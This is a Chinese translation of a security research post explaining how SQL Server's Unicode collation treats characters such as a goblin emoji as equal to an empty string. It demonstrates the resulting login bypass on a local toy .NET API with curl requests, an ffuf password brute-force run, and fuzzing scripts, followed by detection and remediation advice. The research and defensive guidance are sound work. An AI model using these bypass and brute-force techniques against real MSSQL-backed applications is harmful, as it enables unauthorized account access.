#  地穴传说：微软 Unicode 排序规则异常导致软件漏洞   
 Ots安全   2024-11-30 06:19  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
2024 年 11 月 29 日  
根据 Microsoft SQL Server，妖精表情符号和空字符串是同一件事。这里的问题是，几乎每种应用程序语言都倾向于不同意。这可能会导致我最喜欢的一种安全问题——两个系统之间奇怪的处理逻辑不一致导致漏洞。AppSec 的争吵夫妇。这篇文章是关于一种此类情况的文章，这种情况会导致任何使用 MSSQL 作为后端数据库的应用程序出现潜在问题。让我们深入了解！  
  
Stephen Moir - 应用程序安全架构师、Pulse Security 客户和全能冠军 - 最初引起了我的注意。Stephen 和 Pulse 已经合作了一段时间，当我的收件箱中出现标题为“Nulls, whitespace and control characters  
我自然知道是时候为一些该死的恶作剧做好准备”的电子邮件时。Stephen 向我发送了他的概念验证来展示这个问题，我们讨论了可以演示问题的测试工具，现在我们做到了！  
  
看看这个：  
  
```
$ sudo docker exec -it 117e67d62e66 /opt/mssql-tools18/bin/sqlcmd -C -S localhost -U sa -P wehwahblorP2 -d DemoApiDb 
1> SELECT CASE WHEN N'👺' = N'' THEN 'Equal' ELSE 'Not Equal' END ;
2> go
     
-----
Equal

(1 rows affected)
1>
```  
  
  
根据 MSSQL，妖精表情符号和空字符串是同一回事。让我们讨论一下这如何导致漏洞。本文中包含的代码是我自己创建的，是一个简单的测试 API，用于演示该问题。有趣的是，这种行为也会发生：  
  
```
1> SELECT CASE WHEN N'👺a👺b👺c' = N'abc' THEN 'Equal' ELSE 'Not Equal' END ;
2> go
     
-----
Equal

(1 rows affected)
1>
```  
  
  
**漏洞与利用**  
  
好的，所以根据 MSSQL，我们知道妖精和空是一回事。如果连接到 MSSQL 的应用程序正确推断出妖精表情符号不是空字符串，那么我们现在就有一个实例，其中应用程序和数据库具有不同的排序逻辑，有时这会导致漏洞。  
  
这是玩具登录 API 的源代码。我使用 EntityFramework 在 dotnet core 8 上构建了它，代码片段如下 - 忽略明文密码，它与此演示无关。如果您正在构建真实的系统，您需要密码哈希、帐户管理、暴力破解预防、MFA 以及我的愚蠢玩具代码无法完成的一系列事情。  
  
```
namespace apidemo
{
    public class User {
        public int Id { get; set; }
        public string username {get; set;} = ""; 
        public string email {get; set;} = ""; 
        public string? password {get; set;} 
        public bool IsActive {get; set;}
    } 

    public class UserDb: DbContext 
        {
                public UserDb(DbContextOptions<UserDb> options)
                    : base(options){}

                public DbSet<User> Users => Set<User>();
        }

    static class Program
    {
        static void Main(string[] args){
            var builder = WebApplication.CreateBuilder(args);
...yoink...
            app.MapPost("/login", async (UserDb db, [FromForm(Name = "username")] string? user,
                [FromForm(Name = "email")] string? email,
                [FromForm(Name = "password")] string? password) =>
            {
                if(String.IsNullOrWhiteSpace(password)){
                    return Results.BadRequest("Missing password");
                }
                if(!String.IsNullOrWhiteSpace(email)){
                    // login with email
                    var r = await db.Users.Where(u => u.email == email).Where(u => u.password == password).FirstOrDefaultAsync();
                    if(r != null){
                        return Results.Ok($"Logged in user ID {r.Id}");
                    }
                }

                if(!String.IsNullOrWhiteSpace(user)){
                    // login with username
                    var r = await db.Users.Where(u => u.username == user).Where(u => u.password == password).FirstOrDefaultAsync();
                    if(r != null){
                            return Results.Ok($"Logged in user ID {r.Id}");
                    }
                }

                return Results.Ok($"Login Failed");
            }).DisableAntiforgery();
```  
  
  
此代码允许用户通过电子邮件地址或用户名登录。提供用户名和密码？它会匹配。提供电子邮件？它会使用它来匹配您的用户记录。  
  
让我们快速看一下数据库，我们有很多没有设置电子邮件的用户：  
  
```
1> SELECT count(Id) FROM USERS WHERE email = N'';
2> go
           
-----------
       1003 

(1 rows affected)
1>
```  
  
  
如果我们在登录请求中指定一个妖精表情符号作为电子邮件地址，我们就会通过空字符串测试：  
  
```
if(!String.IsNullOrWhiteSpace(email)){
                    // login with email
                    var r = await db.Users.Where(u => u.email == email).Where(u => u.password == password).FirstOrDefaultAsync();
                    if(r != null){
                        return Results.Ok($"Logged in user ID {r.Id}");
                    }
                }
```  
  
  
Dotnet 知道我们的 goblin 实际上不是一个空字符串，但 MSSQL 却不这么认为。  
  
这意味着，如果我们将妖精表情符号指定为电子邮件地址，MSSQL 将检查每一行空白电子邮件，并依次尝试每行的密码。我们可以一次性暴力破解每个拥有空白电子邮件的用户的密码，如果需要，也可以反之破解用户名。这就是我们的漏洞。指定妖精表情符号或任何其他会触发此条件的 Unicode 字符串和密码，并以设置了该密码的任何用户身份登录：  
  
```
:~$ curl -i "http://localhost:5055/login" -X POST -d "email=💩&password=foo"
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 26 Nov 2024 02:56:43 GMT
Server: Kestrel
Transfer-Encoding: chunked

"Logged in user ID 9"
```  
  
  
以上显示用户 ID 9 的密码为foo。我们甚至不需要知道该用户的用户名。这大大提高了暴力密码猜测攻击的有效性，因为我们不再需要有效的用户名。只要任何用户设置了该密码，它就会让我们登录。  
  
下面展示了如何使用该ffuf工具 ( https://github.com/denandz/ffuf ) 进行暴力攻击，并找到有效的密码。我在这里使用我的 fork-of-ffuf，因为它包含审计日志，让我可以解析模糊测试运行信息并执行各种统计分析技巧。  
  
```
$ ./ffuf -w ~/xato-net-10-million-passwords-1000.txt -u "http://localhost:5055/login" -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=👺&password=FUZZ" -mc all -fr "Login Failed" -audit-log=login-brute-1.json

        /'___\ /'___\ /'___\ 
       /\ \__/ /\ \__/ __ __ /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\ \ \_\ \ \____/ \ \_\ 
          \/_/ \/_/ \/___/ \/_/ 

       v2.2.0-doi
________________________________________________

 :: Method : POST
 :: URL : http://localhost:5055/login
 :: Wordlist : FUZZ: /home/doi/xato-net-10-million-passwords-1000.txt
 :: Header : Content-Type: [application/x-www-form-urlencoded]
 :: Data : username=👺&password=FUZZ
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: all
 :: Filter : Regexp: Login Failed
________________________________________________

123123 [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 44ms]
monkey [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 44ms]
696969 [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 44ms]
jordan [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 48ms]
zxcvbnm [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 49ms]
dragon [Status: 200, Size: 24, Words: 5, Lines: 1, Duration: 46ms]
...yoink...
```  
  
  
太棒了。这实际上是真实生活中出现的漏洞的模拟。但核心问题实际上是 MSSQL 对 Unicode 排序规则的奇怪之处。  
  
**但为什么？**  
  
真正的问题是为什么会出现这个错误。总结一下，应用服务器和数据库服务器匹配字符串的方式不同。有时，这些处理逻辑上的差异可以被利用。  
  
```
Dotnet – string.IsNullOrWhiteSpace(👺) - false
SQL – N'👺' == '' - true
```  
  
  
我们可以进一步深入研究 MSSQL 服务器逻辑。演示代码中还有一个 API，允许根据用户名检索用户：  
  
```
// get a user by username
            app.MapGet("/user", async (UserDb db, [FromQuery(Name = "username")] string user) =>
            {
                var r = await db.Users.Where(u => u.username == user).ToListAsync();
                return r;
            });
```  
  
  
模糊测试此请求以查看此问题是否可以由任何 Unicode 字符或仅某些 Unicode 字符触发。  
  
首先，我们需要一个单词列表来完成这项任务。我生成了一个包含所有 Unicode 字素的单词列表，如下所示（注意，这不包括多字符表情符号等，但包括我们的好朋友——妖精），并使用pencode对这些数据进行 URL 编码：  
  
```
$ curl https://www.unicode.org/Public/UCD/latest/ucd/UnicodeData.txt | cut -f1 -d\; | while read codepoint; do echo -e "\U$codepoint"; done  > unicode-utf8.txt
  % Total % Received % Xferd Average Speed Time Time Time Current
                                 Dload Upload Total Spent Left Speed
100 2124k 100 2124k 0 0 528k 0 0:00:04 0:00:04 --:--:-- 529k
$ grep -a 👺 unicode-utf8.txt 
👺
$ pencode -input unicode-utf8.txt urlencode > unicode-utf8-urlencoded.txt 
$ tail -1 unicode-utf8-urlencoded.txt 
%F4%8F%BF%BD
```  
  
  
接下来，我搞清楚了一些基本的响应大小过滤ffuf，并运行了模糊测试。有了新的审计日志功能，这是一个很好的功能，可以清理终端输出，审计日志 JSON 包含所有发送的请求和响应，无论是否过滤。  
  
```
$ curl -i "http://localhost:5055/user?username=q" ; echo 
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Tue, 26 Nov 2024 03:14:56 GMT
Server: Kestrel
Transfer-Encoding: chunked

[]
$ ./ffuf -w unicode-utf8-urlencoded.txt -audit-log=unicode-fuzz-1.json -u "http://localhost:5055/user?username=FUZZ" -mc all -fs 2

        /'___\ /'___\ /'___\ 
       /\ \__/ /\ \__/ __ __ /\ \__/ 
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ 
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ 
         \ \_\ \ \_\ \ \____/ \ \_\ 
          \/_/ \/_/ \/___/ \/_/ 

       v2.2.0-doi
________________________________________________

 :: Method : GET
 :: URL : http://localhost:5055/user?username=FUZZ
 :: Wordlist : FUZZ: /home/doi/go/src/github.com/denandz/ffuf/unicode-utf8-urlencoded.txt
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 40
 :: Matcher : Response status: all
 :: Filter : Response size: 2
________________________________________________

                        [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 29ms]
                        [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 42ms]
%00 [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 63ms]
                        [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 131ms]
+ [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 149ms]
%C7%B9 [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 7ms]
%C7%B7 [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 7ms]
%C8%98 [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 2ms]
%C8%9C [Status: 200, Size: 147, Words: 1, Lines: 1, Duration: 2ms]
...yoink...
```  
  
  
有趣的是，在GET请求中，空字节（%00上文）也会触发此问题。在POST请求中，当以 dotnet 为目标时，它会导致 400 错误，这就是为什么我们在之前的模糊测试运行中没有看到这种行为，当时我们针对的是POST请求而不是GET上面的请求。我还注意到文字加号被解释为空格，因此匹配。这pencode可能是执行 URL 编码时应该标记的内容。下次有空的时候我会深入研究这个问题……  
  
无论如何，让我们看看响应大小，看看是否有任何 Unicode 字素会触发此问题，或者我们是否需要一些特殊的东西。当 MSSQL 中的问题被触发时，响应大小为 147：  
  
```
$ jq '. | select(.Type == "*ffuf.Response").Data.ContentLength' < unicode-fuzz-1.json | sort | uniq -c
  34305 147
   5812 2
```  
  
  
我们可以看到，此单词列表中的 34305 个测试用例触发了该行为，而 5812 个没有触发。因此，这不是一个简单的任何 unicode 字符等于空字符串问题，其中还涉及一些更复杂的问题。我们现在可以找出触发字符和非触发字符以进行进一步分析。ffuf审计日志将有效负载存储为 base64。让我们将它们取出并解码以进行分析：  
  
```
$ jq -r '. | select(.Data.ContentLength == 147) | .Data.Request.Input.FUZZ' < unicode-fuzz-1.json > triggers-base64-url.txt
$ jq -r '. | select(.Data.ContentLength == 2) | .Data.Request.Input.FUZZ' < unicode-fuzz-1.json > nontriggers-base64-url.txt
$ pencode -input triggers-base64-url.txt b64decode urldecode > triggers.txt
$ pencode -input nontriggers-base64-url.txt b64decode urldecode > nontriggers.txt
```  
  
  
然后我们可以比较一些测试用例（shuf只需选择一个随机条目供我们查看）：  
  
```
$ shuf -n1 triggers.txt | xxd
00000000: e18f b20a ....
$ shuf -n1 triggers.txt | xxd
00000000: f096 a988 0a .....
$ shuf -n1 triggers.txt | xxd
00000000: f093 bea3 0a .....
$ shuf -n1 nontriggers.txt | xxd
00000000: e287 8c0a ....
$ shuf -n1 nontriggers.txt | xxd
00000000: efa8 910a ....
$ shuf -n1 nontriggers.txt | xxd
00000000: e0af ab0a
```  
  
  
正如我们所见，这不仅仅是“任何 Unicode 字符”类型的问题。有些 Unicode 字素既会触发问题，又不会触发问题。微软方面的排序逻辑还有很多，这需要深入研究调试器和/或反汇编工具才能弄清楚到底发生了什么。  
  
现在，如果我们想进一步深入研究这个难题，我们有触发和不触发条件的字符示例，这将使逆向工程变得更容易。  
  
**情节愈发复杂**  
  
net481只有 MSSQL 会受到影响吗？有趣的是，不会！Stephen 指出，可以使用以下测试代码从 .NET 领域（以 Windows 为目标）触发此操作。Net481其行为与 MSSQL 相同，但 dotnet core 则不然：  
  
```
namespace consoleapp
{
    internal class Program
    {
        static void Main(string[] args)        {
                if ("Ԥ".Equals("", StringComparison.CurrentCulture))
                {
                    Console.WriteLine("1. Works the same as SQL");
                }
                else {
                    Console.WriteLine("1. Works differently");
                }


                if ("Ԥ".Equals("", StringComparison.InvariantCulture))
                {
                    Console.WriteLine("2. Works the same as SQL");
                }
                else {
                    Console.WriteLine("2. Works differently");
                }

                if ("Ԥ".Equals(""))
                {
                    Console.WriteLine("3. Works the same as SQL");
                }
                else {
                    Console.WriteLine("3. Works differently");
                }
        }
    } 
}
```  
  
  
并执行：  
  
```
C:\Users\DoI\Documents\console>dotnet run
1. Works the same as SQL
2. Works the same as SQL
3. Works differently
```  
  
  
但是，当我在装有 dotnet core 的 Linux 虚拟机（或 Windows 上的目标 dotnet core 9）上运行测试代码时：  
  
```
:~/src/consoleapp$ dotnet run
1. Works differently
2. Works differently
3. Works differently
```  
  
  
我们没发现问题！Windows 世界中一定发生了一些事情，导致出现此排序规则错误。由于此错误确实在 Linux 上的 MSSQL 中也出现了，我敢打赌，Unicode 处理逻辑已被 Microsoft 开发人员从 Windows 库中复制粘贴到 MSSQL 项目中。当然，这纯粹是我的猜测。  
  
**进一步考虑**  
  
有趣的是，这种行为也会发生：  
  
```
1> SELECT CASE WHEN N'👺a👺b👺c' = N'abc' THEN 'Equal' ELSE 'Not Equal' END ;
2> go
     
-----
Equal

(1 rows affected)
1>
```  
  
  
字符之间的 goblins 会被忽略。这可能为利用处理差异提供了其他机会。我想到的一个想法是使用 WAF 或其他拒绝列表作为阻止某种形式的攻击的机制——可能是某些第三方软件中已知密码的硬编码用户——可以通过将一些 goblins 放入字符串中来绕过这种攻击。  
  
**发现和补救**  
  
这类处理不一致漏洞很难发现，因为它们的存在是由于两个系统之间的交互和差异造成的。在本例中，应用程序字符串处理和 MSSQL 数据库字符串处理。  
  
我在这里以 dotnet 为例，但同样的漏洞可能会出现在任何使用 MSSQL 作为后端数据库的应用程序中。以下是有关如何查找问题以及如何考虑修复问题的一些指导：  
  
**检测**  
  
您会注意到，我在示例中没有编写任何 SQL 查询。我使用了一个众所周知的框架（Entity Framework），并让它为我完成所有工作。这意味着，仅通过源代码分析发现此问题可能具有挑战性。以下是我对寻找此问题的人们的建议：  
- 确定您的目标是否由 MSSQL 支持，如果是，请考虑 Unicode 排序规则处理不一致模式。  
  
- 在您正在逆向的应用程序代码或二进制文件中搜索被检查为 null 或空的字符串实例。这些是很好的模糊测试目标。  
  
- 在数据库端记录 SQL 查询并将其映射到攻击者控制的参数，搜索发生字符串比较且列在数据集中包含空字符串的实例。  
  
- 确保您使用强大的 Web 应用程序输入模糊测试流程来查找异常值。这意味着将 Unicode 字符串纳入模糊测试单词列表。注意：在某些情况下，通过模糊测试捕获此问题可能具有挑战性，具体取决于响应数据和时间差异。将其与查看日志记录和二进制/源代码分析相结合。  
  
请记住，您不仅限于手动测试技术、源代码审查或二进制分析 - 您可以在不同的场景中针对同一目标使用所有这些技术来了解正在发生的事情。  
  
**补救措施**  
  
解决这些问题的关键在于警惕检查空字符串，并了解 Unicode 字素可能导致这些排序问题。  
  
不过，这种处理不一致是否会在任何特定情况下造成安全漏洞还不是一目了然的，可能需要逐案分析。我将在这里直接引用 Stephen 的话：  
> 这种行为会造成多大的问题取决于具体应用 […] 这可能是一个大问题。也可能根本不是问题。  
  
  
  
ANDSQL 查询中的附加语句可以解决此问题，有效地附加AND @COLUMN <> “”。  
  
不过，就我的测试 API 而言，我使用的是 EntityFramework，并且无法轻松控制框架使用的底层 SQL 查询。这种攻击很难通过输入验证来防御，因此任何类型的过滤器或逻辑更改都需要经过强大的测试套件，以确保它解决了漏洞。我首先会实现一个允许字符和模式的允许列表——至少对于电子邮件来说这应该相当容易——然后执行进一步的模糊测试以捕获任何边缘情况。  
  
再次强调，这个问题不仅仅影响 dotnet 应用程序——任何使用 MSSQL 作为后端的语言的任何应用程序都可能容易受到类似问题的影响。  
  
这个问题有多严重取决于由此产生的漏洞的实际影响（如果有的话）。与网络安全中的大多数事情一样，细微差别是关键，应该指导建议。  
  
**概括**  
  
撰写这篇文章并深入研究这个问题非常有趣。我特别喜欢我们的一位客户向我们提出这个问题，然后我们一起陷入了这个困境。结果，我们对这些系统的理解都变得更深入，现在我们有了一个奇妙的诅咒边缘案例。  
  
我期待着我们下次一起掉进兔子洞，非常感谢斯蒂芬·莫尔 (Stephen Moir) 带我参与这次冒险。  
  
**奖励环节——“黑盒”渗透测试的局限性**  
  
在本文中，我们研究了由于应用程序和 MSSQL 数据库之间的处理不一致而发生的漏洞。在这种情况下，开发人员可以说没有犯任何错误。自动扫描程序或静态代码分析未检测到该漏洞。此问题可能是通过手动引导的 Web 应用程序模糊测试发现的，如“漏洞和漏洞利用”部分所述。即使没有权限深入研究日志和后端系统以进行适当的安全研究和漏洞搜索，渗透测试人员是否能够解释为什么会发生这种情况？  
  
我认为这很好地展示了传统“黑盒”渗透测试的局限性。了解系统意味着安全测试人员可以找到更好、更深入的漏洞，并更好地解释如何修复它们。甚至 OWASP 应用程序安全验证标准也对此有这样的说法：  
> 级别 1 是唯一一个完全可以使用人工进行渗透测试的级别。所有其他级别都需要访问文档、源代码、配置和参与开发过程的人员。但是，即使 L1 允许进行“黑盒”（没有文档和来源）测试，它也不是有效的保证活动，应该积极阻止。- https://github.com/OWASP/ASVS/blob/master/4.0/en/0x03-Using-ASVS.md#application-security-verification-levels  
  
  
  
因此，如果您是渗透测试人员，请考虑在日常工作中加入研究、逆向工程和/或源代码分析，并询问为什么会发生某些行为。  
  
如果您正在考虑进行某些测试，希望本节能够帮助您提供一个实际的例子，说明为什么安全顾问和测试人员所要求的东西与我们十年前测试系统的方式相比显得有点奇怪。  
  
我认为，如果我们（IT 专业人士）希望看到事情逐步变得更加安全，我们就必须进行合作并超越过去的一般性发现和样板建议。  
  
**测试 API 设置**  
  
设置一些玩具代码来复制功能并更好地理解逻辑是寻找漏洞时非常强大的技术。鉴于我毫无疑问将在不久的将来再次启动 EntityFramework、本地数据库和一些愚蠢的 API，我将包括我的测试实验室设置步骤。希望这能对您、读者以及未来的我有所帮助。  
  
本节末尾包含了我的玩具 API 的源代码。我在 Debian Linux VM 上运行了它。我像这样运行了数据库：  
  
```
sudo docker run --rm -e "ACCEPT_EULA=Y" -e "MSSQL_SA_PASSWORD=..." -p 1433:1433 -d mcr.microsoft.com/mssql/server:2022-latest
```  
  
  
像这样配置 dotnet 应用程序：  
  
```
:~/src/apidemo-csharp$ cat appsettings.Development.json 
{
  "Logging": {
  "LogLevel": {
    "Default": "Debug",
    "System": "Information",
    "Microsoft": "Information"
  }
  },
  "ConnectionStrings" : {
  "DefaultDatabase": "Server=localhost;Database=DemoApiDb;User Id=sa;Password=...;TrustServerCertificate=true"
  }
}
```  
  
  
您需要以下软件包：  
  
```
dotnet add package Microsoft.AspNetCore.Diagnostics.EntityFrameworkCore –prerelease
dotnet add package Microsoft.EntityFrameworkCore.SqlServer
```  
  
  
将玩具代码复制到后Program.cs，您可以使用以下命令设置数据库：  
  
```
dotnet tool install -g dotnet-ef
~/.dotnet/tools/dotnet-ef migrations add InitialCreate -v
~/.dotnet/tools/dotnet-ef database update -v
```  
  
  
最后发布dotnet run并享受乐趣。您需要通过将数据发布到 /users 来创建一些用户。例如：  
  
```
curl -X POST -H "Content-Type: application/json" http://localhost:5055/users -d '{"isActive":true, "password":"foo", "username":"blah"}'; echo
```  
  
  
Program.cs  
  
```
// THIS IS TOY CODE TO TEST EF<->MSSQL UNICODE PROCESSING LOGIC
// DO NOT USE AS A REFERENCE FOR REAL CODE
using Microsoft.EntityFrameworkCore;
using Microsoft.AspNetCore.Mvc;

namespace apidemo
{
  public class User {
    public int Id { get; set; }
    public string username {get; set;} = "";
    public string email {get; set;} = "";
    public string? password {get; set;} 
    public bool IsActive {get; set;}
  }

  public class UserDb: DbContext 
    {
        public UserDb(DbContextOptions<UserDb> options)
          : base(options){}

        public DbSet<User> Users => Set<User>();
    }

  static class Program
  {
    static void Main(string[] args){
      var builder = WebApplication.CreateBuilder(args);
      builder.Services.AddDbContext<UserDb>(opt => {
              opt.UseSqlServer(builder.Configuration.GetConnectionString("DefaultDatabase"));
          });
      var app = builder.Build();

      app.MapGet("/", () => "Demlo");

      // login a user
      app.MapPost("/login", async (UserDb db, [FromForm(Name = "username")] string? user,
        [FromForm(Name = "email")] string? email,
        [FromForm(Name = "password")] string? password) =>
      {
        if(String.IsNullOrWhiteSpace(password)){
          return Results.BadRequest("Missing password");
        }
        if(!String.IsNullOrWhiteSpace(email)){
          // login with email
          var r = await db.Users.Where(u => u.email == email).Where(u => u.password == password).FirstOrDefaultAsync();
          if(r != null){
            return Results.Ok($"Logged in user ID {r.Id}");
          }
        }

        if(!String.IsNullOrWhiteSpace(user)){
          // login with username
          var r = await db.Users.Where(u => u.username == user).Where(u => u.password == password).FirstOrDefaultAsync();
          if(r != null){
              return Results.Ok($"Logged in user ID {r.Id}");
          }
        }

        return Results.Ok($"Login Failed");
      }).DisableAntiforgery();

      // get a user by username
      app.MapGet("/user", async (UserDb db, [FromQuery(Name = "username")] string user) =>
      {
        var r = await db.Users.Where(u => u.username == user).ToListAsync();
        return r;
      });

      // list all users
      app.MapGet("/users", async (UserDb db) => await db.Users.ToListAsync());

      // add a user
      app.MapPost("/users", async (User user, UserDb db) =>
      {
        db.Users.Add(user);
        await db.SaveChangesAsync();

        return Results.Created($"/users/{user.Id}", user);
      });
      app.Run();
    }
  }
}
```  
  
  
  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
